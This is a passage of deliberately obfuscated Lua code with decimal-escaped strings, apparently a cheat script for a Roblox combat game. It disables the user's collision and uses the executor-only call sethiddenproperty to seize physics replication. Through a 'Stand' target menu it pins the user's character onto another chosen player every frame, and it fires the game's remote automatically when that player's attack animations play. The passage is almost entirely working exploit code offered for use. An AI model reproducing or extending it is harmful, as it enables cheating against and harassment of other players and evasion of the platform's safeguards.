"\065\116\111\109\105\099\032\083\108\097\115\104" }, { "\067\114\117\115\104\105\110\103\032\080\117\108\108", 0x3C1F7416E, 0x15, 0x1, "\067\114\117\115\104\105\110\103\032\080\117\108\108" }, { "\087\105\110\100\115\116\111\114\109\032\070\117\114\121", 0x3D86BDFA9, 0x14, 0x2, "\087\105\110\100\115\116\111\114\109\032\070\117\114\121" }, { "\083\116\111\110\101\032\067\111\102\102\105\110", 0x3D364A88F, 0x19, 0x3, "\083\116\111\110\101\032\067\111\102\102\105\110" }, { "\069\120\112\117\108\115\105\118\101\032\080\117\115\104", 0x3DD470A9E, 0x13, 0x4, "\069\120\112\117\108\115\105\118\101\032\080\117\115\104" }, { "\067\111\115\109\105\099\032\083\116\114\105\107\101", 0x3E59E3FDA, 0x1E, 0x1, "\067\111\115\109\105\099\032\083\116\114\105\107\101" }, { "\080\115\121\099\104\105\099\032\082\105\099\111\099\104\101\116", 0x410F95256, 0xF, 0x2, "\080\115\121\099\104\105\099\032\082\105\099\111\099\104\101\116" }, { "\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111", 0x405ADE1D9, 0x65, 0x3, "\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111" }, { "\083\107\121\032\083\110\097\116\099\104\101\114", 0x428911BAC, 0x11, 0x4, "\083\107\121\032\083\110\097\116\099\104\101\114" }, { "\066\117\108\108\101\116\032\066\097\114\114\097\103\101", 0x424EA9E22, 0x14, 0x1, "\066\117\108\108\101\116\032\066\097\114\114\097\103\101" }, { "\086\097\110\105\115\104\105\110\103\032\075\105\099\107", 0x4273A6237, 0x17, 0x2, "\086\097\110\105\115\104\105\110\103\032\075\105\099\107" }, { "\087\104\105\114\108\119\105\110\100\032\068\114\111\112", 0x428683AB6, 0xF, 0x3, "\087\104\105\114\108\119\105\110\100\032\068\114\111\112" }, { "\072\101\097\100\032\070\105\114\115\116", 0x43B904C5F, 0x14, 0x4, "\072\101\097\100\032\070\105\114\115\116" }, { "\071\114\097\110\100\032\070\105\115\115\117\114\101", 0x75EAD1B1F95A, 0x12, 0x1, "\071\114\097\110\100\032\070\105\115\115\117\114\101" }, { "\084\119\105\110\032\070\097\110\103\115", 0x4664D93C9, 0xF, 0x2, "\084\119\105\110\032\070\097\110\103\115" }, { "\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101", 0x4665B290F, 0x1E, 0x3, "\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101" }, { "\076\097\115\116\032\066\114\101\097\116\104", 0x6117F1378FD4, 0x65, 0x4, "\076\097\115\116\032\066\114\101\097\116\104" }, { "\082\097\118\097\103\101", 0x3F208EF3E, 17.5, 0x1, "\082\097\118\097\103\101" }, { "\083\119\105\102\116\032\083\119\101\101\112", 0x3F1F4F9A3, 0xF, 0x2, "\083\119\105\102\116\032\083\119\101\101\112" }, { "\067\111\108\108\097\116\101\114\097\108\032\082\117\105\110", 0x408AA664F, 22.5, 0x3, "\067\111\108\108\097\116\101\114\097\108\032\082\117\105\110" }, { "\083\112\105\114\097\108\105\110\103\032\083\116\111\114\109", 0x476A3E943C08, 22.5, 0x4, "\083\112\105\114\097\108\105\110\103\032\083\116\111\114\109" }, { "\083\116\111\105\099\032\066\111\109\098", 0x3FDB13D4B, 0xF, 0x1, "\083\116\111\105\099\032\066\111\109\098" }, { "\050\048\050\048\050\048\032\068\114\111\112\107\105\099\107", 0x40A6FEB43, 0x65, 0x2, "\050\048\045\050\048\045\050\048\032\068\114\111\112\107\105\099\107" }, { "\070\105\118\101\032\083\101\097\115\111\110\115", 0x44C7960B9, 0x64, 0x3, "\070\105\118\101\032\083\101\097\115\111\110\115" }, { "\085\110\108\105\109\105\116\101\100\032\070\108\101\120\032\087\111\114\107\115", 0x46B14121D763, 0x0, 0x4, "\085\110\108\105\109\105\116\101\100\032\070\108\101\120\032\087\111\114\107\115" }, { "\080\101\114\109\097\102\114\111\115\116", 0x5B751EFEA87E, 0x14, 0x1, "\080\101\114\109\097\102\114\111\115\116" }, { "\070\114\111\115\116\032\070\111\114\103\101", 0x7D1C890B331D, 0xF, 0x2, "\070\114\111\115\116\032\070\111\114\103\101" }, { "\070\114\101\101\122\105\110\103\032\080\097\116\104", 0x666D78DD57AB, 0x19, 0x3, "\070\114\101\101\122\105\110\103\032\080\097\116\104" }, { "\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110", 0x44B5CB491D1E, 0x14, 0x4, "\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110" }, { "\087\101\098\111\111\109", 0x66EC9CABB715, 0x14, 0x1, "\087\101\098\111\111\109" }, { "\084\114\105\110\105\116\121\032\084\101\097\114", 0x467E9DCA4C31, 0x19, 0x2, "\084\114\105\110\105\116\121\032\084\101\097\114" }, { "\080\108\097\115\109\097\032\067\097\110\110\111\110", 0x6A2FDA1EFF14, 0x14, 0x3, "\080\108\097\115\109\097\032\067\097\110\110\111\110" }, { "\068\111\117\098\108\101\032\084\114\111\117\098\108\101", 0x7DE9F29653F8, 0x14, 0x4, "\068\111\117\098\108\101\032\084\114\111\117\098\108\101" }, { "\068\111\111\109\032\068\105\118\101", 0x5C64F0B4E7E8, 0x17, 0x1, "\068\111\111\109\032\068\105\118\101" }, { "\067\114\111\119\100\032\066\117\115\116\101\114", 0x5FE64DA60A4F, 0x16, 0x2, "\067\114\111\119\100\032\066\117\115\116\101\114" }, { "\072\097\109\109\101\114\032\072\101\101\108", 0x63B2575B596A, 0x12, 0x3, "\072\097\109\109\101\114\032\072\101\101\108" }, { "\066\105\110\100\105\110\103\032\067\108\111\116\104", 0x728E532EA71F, 0x14, 0x4, "\066\105\110\100\105\110\103\032\067\108\111\116\104" }, { "\072\097\109\109\101\114\032\072\101\101\108", 0x7B0BA1E7B413, 0x12, 0x3, "\072\097\109\109\101\114\032\072\101\101\108" }, { "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115", 0x30525E1EE, 0xF, 0x1, "\077\097\099\104\105\110\101\032\071\117\110\032\066\108\111\119\115" }, { "\067\114\117\115\104\101\100\032\082\111\099\107", 0x41E4FAC54CF9, 9.58, 0x4, "\067\114\117\115\104\101\100\032\082\111\099\107" }, { "\066\108\111\099\107", 0x31D8E78D1, 0x0, 0x0, "\066\108\111\099\107" }, { "\066\108\111\099\107", 0x31CEEBF71, 0x0, 0x0, "\066\108\111\099\107" }, { "\066\108\111\099\107", 0x33E9F9888, 0x0, 0x0, "\066\108\111\099\107" }, } local function _lllIIIlIlI() local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 for _lllIlllIIl, _IIIIIlIlll in pairs(_IIllllIlII:GetDescendants()) do if _IIIIIlIlll:IsA("\066\097\115\101\080\097\114\116") then _IIIIIlIlll.CanCollide = false end
 end
 end
 local _lllIIlIIll = {} local function _llllIlllll() if not _lIlIlIlIIl or not _lIlIlIlIIl.Character then return end
 if not _llIIIlIIll.Character then return end
 local _IlIlIlIlll = _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIIIllIl = _lIlIlIlIIl.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIlIlIlll or not _IllIIIllIl then return end
 _lllIIlIIll = {} for _lllIlllIIl, _IIIIIlIlll in pairs(_llIIIlIIll.Character:GetDescendants()) do if _IIIIIlIlll:IsA("\066\097\115\101\080\097\114\116") then _lllIIlIIll[_IIIIIlIlll] = { CanCollide = _IIIIIlIlll.CanCollide, Massless = _IIIIIlIlll.Massless } _IIIIIlIlll.CanCollide = false _IIIIIlIlll.Massless = true end
 end
 local _IlIIIlIIII = _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then pcall( function () _IlIIIlIIII.AutoRotate = false end
 ) _IlIIIlIIII.PlatformStand = true end
 _IlIlIlIlll.CFrame = _IllIIIllIl.CFrame * _llllIIIIIl _IlIlIlIlll.AssemblyLinearVelocity = Vector3.zero _IlIlIlIlll.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IlIlIlIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IllIIIllIl) end
 ) end
 end
 local function _IlIlIlIIII(_IIIIllllII) _llllIIIIIl = _IIIIllllII end
 local _IllIIIlIlI = {} local function _lllIlllllI() for _lllIlllIIl, _IIIlIlllll in pairs(_IllIIIlIlI) do pcall( function () _IIIlIlllll:Disconnect() end
 ) end
 _IllIIIlIlI = {} end
 local _lIllllIllI = { { _IIIIllIIlI = "\049\054\049\051\054\049\052\052\053\054\056", _IlIIIIIlll = "\073\100\108\101\032\049", tpos = 0.69, free = true, oscillate = true, tposMin = 0.45, tposMax = 0.70, _lllIlllllI = 0.1 }, { _IIIIllIIlI = "\049\055\056\054\049\056\052\048\049\054\055", _IlIIIIIlll = "\073\100\108\101\032\050", tpos = 0x1, free = false, oscillate = false }, { _IIIIllIIlI = "\049\054\053\050\052\053\050\050\054\055\051", _IlIIIIIlll = "\073\100\108\101\032\051", tpos = 0.71, free = false, oscillate = false }, { _IIIIllIIlI = "\049\053\048\057\057\055\053\054\049\051\050", _IlIIIIIlll = "\073\100\108\101\032\052", tpos = 0x0, free = true, oscillate = false }, } local function _lllIIlIllI() if not _IIIIllIIlI or not _IllIIIlIIl then return end
 local _lllllIlllI = tick() if _IIlIlllIII and _IIlIlllIII.IsPlaying and (_lllllIlllI - _IIIIIllIlI) < 0.1 then return end
 _IIIIIllIlI = _lllllIlllI local _IIllllIlII = _llIIIlIIll.Character local _lllllIlIlI = _IIllllIlII and _IIllllIlII:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _lllllIlIlI and _lllllIlIlI:FindFirstChildWhichIsA("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then return end
 local _lIlIIIIllI local _IlllIlIlII = _IlIllIIllI.StandIdleAnimDropdown and _IlIllIIllI.StandIdleAnimDropdown.Value or "\082\097\110\100\111\109" if _IlllIlIlII ~= "\082\097\110\100\111\109" then for _lllIlllIIl, _lIIIIIIIII in ipairs(_lIllllIllI) do if _lIIIIIIIII.name == _IlllIlIlII then _lIlIIIIllI = _lIIIIIIIII break end
 end
 end
 if not _lIlIIIIllI then local _lIllIIIIII repeat _lIllIIIIII = math.random(0x1, #_lIllllIllI) until _lIllIIIIII ~= _IllllIIIlI _IllllIIIlI = _lIllIIIIII _lIlIIIIllI = _lIllllIllI[_lIllIIIIII] end
 if _lIllIlIIll then _lIllIlIIll:Disconnect() _lIllIlIIll = nil end
 if _IIlIlllIII then pcall( function () _IIlIlllIII:Stop(0x0) end
 ) _IIlIlllIII = nil end
 local _IlIlIlIIll = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIlIlIIll.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lIlIIIIllI.id local _llIlIlIIlI = _IIIIlIIllI:LoadAnimation(_IlIlIlIIll) _llIlIlIIlI.Priority = Enum.AnimationPriority.Action4 _llIlIlIIlI.Looped = true _IIlIlllIII = _llIlIlIIlI if _lIlIIIIllI.free then _llIlIlIIlI:Play() _llIlIlIIlI:AdjustWeight(0x1) if _lIlIIIIllI.oscillate then _llIlIlIIlI.TimePosition = _lIlIIIIllI.tpos _llIlIlIIlI:AdjustSpeed(-(_lIlIIIIllI.speed or 0.1)) elseif _lIlIIIIllI.tpos then _llIlIlIIlI.TimePosition = _lIlIIIIllI.tpos end
 _lIllIlIIll = RunService.RenderStepped:Connect( function () if not _IIIIllIIlI then if _lIllIlIIll then _lIllIlIIll:Disconnect() _lIllIlIIll = nil end
 pcall( function () _llIlIlIIlI:Stop(0x0) end
 ) _IIlIlllIII = nil return end
 if _llIllIIIll > 0x0 then if _llIlIlIIlI.IsPlaying then pcall( function () _llIlIlIIlI:Stop(0x0) end
 ) end
 return end
 if not _llIlIlIIlI.IsPlaying then return end
 _llIlIlIIlI:AdjustWeight(0x1) if _lIlIIIIllI.freezeAt and _llIlIlIIlI.TimePosition >= _lIlIIIIllI.freezeAt then _llIlIlIIlI:AdjustSpeed(0x0) _llIlIlIIlI.TimePosition = _lIlIIIIllI.freezeAt elseif _lIlIIIIllI.oscillate then local _llIlIIllII = _lIlIIIIllI.speed or 0.1 if _llIlIlIIlI.TimePosition >= _lIlIIIIllI.tposMax then _llIlIlIIlI:AdjustSpeed(-_llIlIIllII) elseif _llIlIlIIlI.TimePosition <= _lIlIIIIllI.tposMin then _llIlIlIIlI:AdjustSpeed(_llIlIIllII) end
 end
 end
 ) else _llIlIlIIlI:Play() _llIlIlIIlI:AdjustSpeed(0x0) _llIlIlIIlI:AdjustWeight(0x1) _llIlIlIIlI.TimePosition = _lIlIIIIllI.tpos _lIllIlIIll = RunService.RenderStepped:Connect( function () if not _IIIIllIIlI then if _lIllIlIIll then _lIllIlIIll:Disconnect() _lIllIlIIll = nil end
 pcall( function () _llIlIlIIlI:Stop(0x0) end
 ) _IIlIlllIII = nil return end
 if _llIllIIIll > 0x0 then if _llIlIlIIlI.IsPlaying then pcall( function () _llIlIlIIlI:Stop(0x0) end
 ) end
 return end
 if not _llIlIlIIlI.IsPlaying then return end
 _llIlIlIIlI:AdjustSpeed(0x0) _llIlIlIIlI:AdjustWeight(0x1) _llIlIlIIlI.TimePosition = _lIlIIIIllI.tpos end
 ) end
 end
 local function _IllIllllll() _llIllIIIll = 0x0 _IIIIIllIlI = 0x0 if _lIllIlIIll then _lIllIlIIll:Disconnect() _lIllIlIIll = nil end
 if _IIlIlllIII then pcall( function () _IIlIlllIII:Stop(0x0) end
 ) _IIlIlllIII = nil end
 if _llIIlIIllI then _llIIlIIllI:Disconnect() _llIIlIIllI = nil end
 if _lllIlllIlI then _lllIlllIlI:Disconnect() _lllIlllIlI = nil end
 if _IIIlIlIIlI then _IIIlIlIIlI:Disconnect() _IIIlIlIIlI = nil end
 if _IIIlllIlII then _IIIlllIlII:Disconnect() _IIIlllIlII = nil end
 if _llllIlllII then _llllIlllII:Disconnect() _llllIlllII = nil end
 if _IlIlIlIIIl then _IlIlIlIIIl:Disconnect() _IlIlIlIIIl = nil end
 _lllIlllllI() pcall( function () if _llIIIlIIll.Character then local _IlIIIlIIII = _llIIIlIIll.Character:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then _IlIIIlIIII.PlatformStand = false pcall( function () _IlIIIlIIII.AutoRotate = true end
 ) end
 local _llIIlIIlII = _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIlIIlII then _llIIlIIlII.AssemblyLinearVelocity = Vector3.zero _llIIlIIlII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIIlIIlII.Velocity = Vector3.zero end
 ) pcall( function () _llIIlIIlII.RotVelocity = Vector3.zero end
 ) if sethiddenproperty then pcall( function () sethiddenproperty(_llIIlIIlII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIIlIIlII) end
 ) end
 end
 for _lIIIIIIIII, state in pairs(_lllIIlIIll) do if _lIIIIIIIII and _lIIIIIIIII.Parent then _lIIIIIIIII.CanCollide = state.CanCollide _lIIIIIIIII.Massless = state.Massless end
 end
 _lllIIlIIll = {} end
 end
 ) _IlIlIIIlIl = { 0x0, 0x0, 0x0, 0x0 } end
 local function _IIIlIIllll() _IllIIIlIIl = not _IllIIIlIIl if _IllIIIlIIl then _lIIlIIIIll() else if _llIIlIIllI then _llIIlIIllI:Disconnect() _llIIlIIllI = nil end
 if _lllIlllIlI then _lllIlllIlI:Disconnect() _lllIlllIlI = nil end
 pcall( function () local _lllllIlIlI = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lllllIlIlI then _lllllIlIlI.PlatformStand = false end
 end
 ) end
 pcall( function () _IlIllIIllI.StandMethodDropdown:SetValue(_IllIIIlIIl and "\070\111\108\108\111\119" or "\068\111\110\039\116\032\070\111\108\108\111\119") end
 ) end
 local function _lllIIlllll(_IIlIllIllI) local _IIllllIlII = _IIlIllIllI.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then return end
 if _IIIlIlIIlI then _IIIlIlIIlI:Disconnect() _IIIlIlIIlI = nil end
 _IIIlIlIIlI = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or '' if _IlllIllIII:match("\049\048\052\055\048\051\056\057\056\050\055") or _IlllIllIII:match("\049\051\051\056\048\055\055\056\049\057\051") or _IlllIllIII:match("\049\051\051\055\048\051\049\048\053\049\051") or _IlllIllIII:match("\049\051\057\051\053\053\052\056\053\053\050") then _llIIllIllI = _llIIllIllI + 0x1 if _llIIllIllI >= 0x3 then _llIIllIllI = 0x0 _IIIlIIllll() end
 task.delay(0x1, function () if _llIIllIllI > 0x0 then _llIIllIllI = _llIIllIllI - 0x1 end
 end
 ) return end
 for _lllIlllIIl, _IIlIlIlIII in pairs(_IlIlllIlIl) do if _IlllIllIII == "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(_IIlIlIlIII[0x2]) then local _IlIIllIlll = _IIlIlIlIII[0x4] if _IlIIllIlll == 0x0 then break end
 _IlIlIIIlIl[_IlIIllIlll] = _IIlIlIlIII[0x3] task.spawn( function () task.wait(_IIlIlIlIII[0x3]) _IlIlIIIlIl[_IlIIllIlll] = 0x0 end
 ) end
 end
 end
 ) _lllIlllllI() for _lllIlllIIl, _IIlIlIlIII in pairs(_IlIlllIlIl) do local _lllIlllIIl = "\072\111\108\100\105\110\103" .. string.gsub(_IIlIlIlIII[0x1], "\032", '') pcall( function () _IIllllIlII:SetAttribute(_lllIlllIIl, false) end
 ) local _IllIIIllII = _IIllllIlII:GetAttributeChangedSignal(_lllIlllIIl):Connect( function () if _IIllllIlII:GetAttribute(_lllIlllIIl) == true and _IlIlIIIlIl[_IIlIlIlIII[0x4]] ~= 0x0 then for _lllIlllIIl, other in pairs(_IlIlllIlIl) do if other[0x4] == _IIlIlIlIII[0x4] and _llIIIlIIll.Backpack:FindFirstChild(other[0x5]) then pcall( function () _llIIIlIIll.Character.Communicate:FireServer(unpack({{ Tool = _llIIIlIIll.Backpack:WaitForChild(other[0x5]), Goal = "\067\111\110\115\111\108\101\032\077\111\118\101", }})) end
 ) end
 end
 end
 end
 ) table.insert(_IllIIIlIlI, _IllIIIllII) end
 end
 local function _lIIIIIIlll() if _llllIlllII then _llllIlllII:Disconnect() _llllIlllII = nil end
 local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIIlIIII and _IlIIIlIIII:FindFirstChildWhichIsA("\065\110\105\109\097\116\111\114") if not _IlIIIlIIII then return end
 local function _IIIIllIlII(_llIIllIlIl) local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or '' _IlllIllIII = _IlllIllIII:gsub("\037\115\043", '') for _lllIlllIIl, _IIlIlIlIII in pairs(_IlIlllIlIl) do local _IIlIllIIlI = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(_IIlIlIlIII[0x2]) if _IlllIllIII == _IIlIllIIlI then if _IIlIlIlIII[0x4] == 0x0 then break end
 _IlIlIlIIII(_IlIlllIIlI) task.spawn( function () if _lllIlllIlI then _lllIlllIlI:Disconnect() _lllIlllIlI = nil end
 local _llIIIllIIl = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIIIllIlIl = ( not _IllIIIlIIl) and _llIIIllIIl and _llIIIllIIl.CFrame _llIllIIIll = _llIllIIIll + 0x1 pcall( function () local _IlIIIlIIII = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then _IlIIIlIIII.PlatformStand = false end
 end
 ) _lllIlllIlI = RunService.Heartbeat:Connect( function () local _llIllllllI = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIIIIlIlIl = _lIlIlIlIIl and _lIlIlIlIIl.Character and _lIlIlIlIIl.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIllllllI and _IIIIIlIlIl then _llIllllllI.CFrame = _IIIIIlIlIl.CFrame * _IlIlllIIlI _llIllllllI.AssemblyLinearVelocity = Vector3.zero _llIllllllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIllllllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIIIlIlIl) end
 ) end
 end
 end
 ) _llIIllIlIl.Stopped:Wait() if _lllIlllIlI then _lllIlllIlI:Disconnect() _lllIlllIlI = nil end
 _llIllIIIll = math.max(0x0, _llIllIIIll - 0x1) if _llIllIIIll > 0x0 then return end
 _IlIlIlIIII(_llIIIlIIII) if _IllIIIlIIl then _IIIIIllIlI = 0x0 else local _lIllIIIIll = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIllIIIIll and _IIIIllIlIl then _lIllIIIIll.CFrame = _IIIIllIlIl _lIllIIIIll.AssemblyLinearVelocity = Vector3.zero _lIllIIIIll.AssemblyAngularVelocity = Vector3.zero end
 end
 end
 ) break end
 end
 end
 _llllIlllII = _IlIIIlIIII.AnimationPlayed:Connect(_IIIIllIlII) if _IIIIlIIllI then local _lIIIlIllII = _IIIIlIIllI.AnimationPlayed:Connect(_IIIIllIlII) local _lIllIlllIl = _llllIlllII _llllIlllII = { Disconnect = function () pcall( function () _lIllIlllIl:Disconnect() end
 ) pcall( function () _lIIIlIllII:Disconnect() end
 ) end
 } end
 end
 _lIIlIIIIll = function () if _llIIlIIllI then _llIIlIIllI:Disconnect() _llIIlIIllI = nil end
 _llIIlIIllI = RunService.Heartbeat:Connect( function () if not _IIIIllIIlI or _llIllIIIll > 0x0 then return end
 if not _lIlIlIlIIl or not _lIlIlIlIIl.Character then return end
 if not _llIIIlIIll.Character then return end
 local _IlIlIlIlll = _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIIIllIl = _lIlIlIlIIl.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIlIlIlll or not _IllIIIllIl then return end
 local _IlIIIlIIII = _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then pcall( function () _IlIIIlIIII.AutoRotate = false end
 ) if _IllIIIlIIl then _IlIIIlIIII.PlatformStand = true end
 end
 if _IllIIIlIIl then _lllIIIlIlI() _IlIlIlIlll.CFrame = _IllIIIllIl.CFrame * _llllIIIIIl _IlIlIlIlll.AssemblyLinearVelocity = Vector3.zero _IlIlIlIlll.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IlIlIlIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IllIIIllIl) end
 ) end
 local _lIlIlIllII = false if not _IIlIlllIII then _lIlIlIllII = true else local _llIIIlllIl, _playing = pcall( function () return _IIlIlllIII.IsPlaying end
 ) _lIlIlIllII = not _llIIIlllIl or not _playing end
 if _lIlIlIllII then local _IllIlIlllI = tick() if _IllIlIlllI - _IIIIIllIlI >= 0x1 then _IIIIIllIlI = _IllIlIlllI task.defer(_lllIIlIllI) end
 end
 end
 end
 ) end
 local function _llIlllllll(_IIlIllIllI) _IllIllllll() _IIIIllIIlI = true _lIlIlIlIIl = _IIlIllIllI _llllIIIIIl = _llIIIlIIII local _IIllllIlII = _IIlIllIllI.Character if not _IIllllIlII then _IIIlllIlII = _IIlIllIllI.CharacterAdded:Connect( function (_IIllllIlII) local _IlIIIlIIII = _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _IlIIIlIIII then return end
 _IlIIIlIIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) _llIlllllll(_IIlIllIllI) end
 ) return end
 _llllIlllll() _lllIIlllll(_IIlIllIllI) _lIIIIIIlll() _lIIlIIIIll() task.defer(_lllIIlIllI) _IIIlllIlII = _IIlIllIllI.CharacterAdded:Connect( function (_IIllllIlII) local _IlIIIlIIII = _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _IlIIIlIIII then return end
 _IlIIIlIIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) if _IIIIllIIlI then _llIlllllll(_IIlIllIllI) end
 end
 ) if _IlIlIlIIIl then _IlIlIlIIIl:Disconnect() end
 _IlIlIlIIIl = game:GetService("\080\108\097\121\101\114\115").PlayerRemoving:Connect( function (_IIIIIlIlll) if _IIIIIlIlll == _IIlIllIllI then _lllIIlIIII() pcall( function () _IlIllIIllI.StandMethodDropdown:SetValue("\079\102\102") end
 ) _IllIIlIIll:Notify({ Title = _lIllIllIII("\083\116\097\110\100"), Content = "\084\097\114\103\101\116\032\104\097\115\032\108\101\102\116\032\116\104\101\032\103\097\109\101\046", _IllIIlIlll = 0x3 }) end
 end
 ) if _IlIIIIIIlI then _IlIIIIIIlI:Disconnect() end
 _IlIIIIIIlI = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) local _IlIIIlIIII = _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _IlIIIlIIII then return end
 _IlIIIlIIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) if not _IIIIllIIlI then return end
 if _lIllIlIIll then _lIllIlIIll:Disconnect() _lIllIlIIll = nil end
 if _IIlIlllIII then pcall( function () _IIlIlllIII:Stop(0x0) end
 ) _IIlIlllIII = nil end
 _IIIIIllIlI = 0x0 _llllIlllll() _lIIIIIIlll() if _IllIIIlIIl then task.defer(_lllIIlIllI) end
 end
 ) end
 local function _lllIIlIIII() _IIIIllIIlI = false _IllIllllll() if _IlIIIIIIlI then _IlIIIIIIlI:Disconnect() _IlIIIIIIlI = nil end
 end
 local function _IIlllIIlll() local _lllIllIlll = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local _IIIlIllIIl = {} for _lllIlllIIl, _IIIIIlIlll in pairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do if _IIIIIlIlll ~= _lllIllIlll then table.insert(_IIIlIllIIl, _IIIlllIIll(_IIIIIlIlll)) end
 end
 return _IIIlIllIIl end
 local _IIIlIIIlII = _IIlllIIlll() local _lIlIIIIIIl = "" local _lIlIIIlllI = _lllIIIIlIl:AddDropdown("\083\116\097\110\100\084\097\114\103\101\116\068\114\111\112\100\111\119\110", { Text = "\084\097\114\103\101\116\032\080\108\097\121\101\114", Values = _IIIlIIIlII, Default = "", Searchable = true, AllowNull = true, Callback = function (_lIllIlIIll) if _lIllIlIIll ~= "" and _lIllIlIIll == _lIlIIIIIIl then pcall( function () _IlIllIIllI.StandTargetDropdown:SetValue("") end
 ) _lIlIIIIIIl = "" _lllIIlIIII() _lIlIlIlIIl = nil return end
 _lIlIIIIIIl = _lIllIlIIll local _lIIIllIlIl = _IIIIllIIlI _lllIIlIIII() local _IIlIIllllI = _IlIllIIIII(_lIllIlIIll) if _IIlIIllllI then _lIlIlIlIIl = _IIlIIllllI if _lIIIllIlIl then _llIlllllll(_IIlIIllllI) end
 end
 end
 , }) game:GetService("\080\108\097\121\101\114\115").PlayerAdded:Connect( function () pcall( function () _lIlIIIlllI:SetValues(_IIlllIIlll()) end
 ) end
 ) game:GetService("\080\108\097\121\101\114\115").PlayerRemoving:Connect( function () pcall( function () _lIlIIIlllI:SetValues(_IIlllIIlll()) end
 ) end
 ) _lllIIIIlIl:AddDropdown("\083\116\097\110\100\077\101\116\104\111\100\068\114\111\112\100\111\119\110", { Text = "\083\116\097\110\100\032\077\101\116\104\111\100", Values = { "\079\102\102", "\070\111\108\108\111\119", "\068\111\110\039\116\032\070\111\108\108\111\119" }, Default = "\079\102\102", Callback = function (_lIllIlIIll) if _lIllIlIIll == "\079\102\102" then _IIIIllIIlI = false _IllIIIlIIl = true _lllIIlIIII() elseif _lIllIlIIll == "\070\111\108\108\111\119" then _IllIIIlIIl = true local _llIlIlIIll = _IlIllIIllI.StandTargetDropdown and _IlIllIIllI.StandTargetDropdown.Value or "" local _IIIlIlIIll = _IlIllIIIII(tostring(_llIlIlIIll)) if _IIIlIlIIll then _llIlllllll(_IIIlIlIIll) else _IllIIlIIll:Notify({ Title = _lIllIllIII("\083\116\097\110\100"), Content = "\080\108\101\097\115\101\032\115\101\108\101\099\116\032\097\032\118\097\108\105\100\032\116\097\114\103\101\116\032\102\105\114\115\116\046", _IllIIlIlll = 0x3 }) pcall( function () _IlIllIIllI.StandMethodDropdown:SetValue("\079\102\102") end
 ) end
